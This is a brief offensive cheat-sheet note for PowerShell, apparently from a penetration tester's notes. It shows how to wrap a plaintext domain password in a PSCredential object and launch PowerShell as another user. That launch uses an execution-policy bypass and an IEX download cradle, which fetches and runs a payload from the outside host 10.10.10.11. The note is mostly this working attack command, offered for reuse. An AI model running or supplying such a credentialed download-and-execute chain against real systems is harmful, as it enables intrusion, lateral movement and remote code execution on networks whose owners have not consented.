# $cred in pwsh

Fancy replacement to runas

### 1) Get into shell

    shell

### 2) Run the following

    $pass = ConvertTo-SecureString 'NewP@ssword123!' -AsPlainText -Force`
    $Cred = New-Object System.Management.Automation.PSCredential("domain\user", $pass)

### 3) Start the process

    Start-Process powershell.exe -Credential $Cred -ArgumentList "-exec bypass -C `"IEX(New-Object Net.WebClient).DownloadString('http://10.10.10.11/payload.txt')`""
